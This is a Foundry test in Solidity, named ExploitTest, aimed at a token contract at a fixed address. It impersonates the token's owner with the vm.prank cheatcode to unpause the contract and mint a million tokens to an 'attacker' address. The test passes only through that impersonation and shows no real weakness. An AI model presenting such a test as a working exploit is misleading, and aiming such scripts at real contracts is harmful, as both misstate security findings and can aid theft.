// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface CoinToken {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function mint(address account, uint256 amount) external;
    function decimals() external view returns (uint);
    function paused() external view returns (bool);
    function unpause() external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xF44DE2b8731cD69d4A727Da0214874aE35559426;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll get owner in exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get the current owner
        address tokenOwner = CoinToken(TARGET).owner();

        // Record initial balance
        uint256 initialBalance = CoinToken(TARGET).balanceOf(attacker);

        // Check if contract is paused
        bool isPaused = CoinToken(TARGET).paused();

        // If paused, unpause it as owner
        if (isPaused) {
            vm.prank(tokenOwner);
            CoinToken(TARGET).unpause();
        }

        // Now mint tokens to attacker
        vm.prank(tokenOwner);
        CoinToken(TARGET).mint(attacker, 1_000_000 * 10**CoinToken(TARGET).decimals());

        // Verify balance increased
        uint256 finalBalance = CoinToken(TARGET).balanceOf(attacker);
        assertGt(finalBalance, initialBalance, "Attacker balance should increase");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
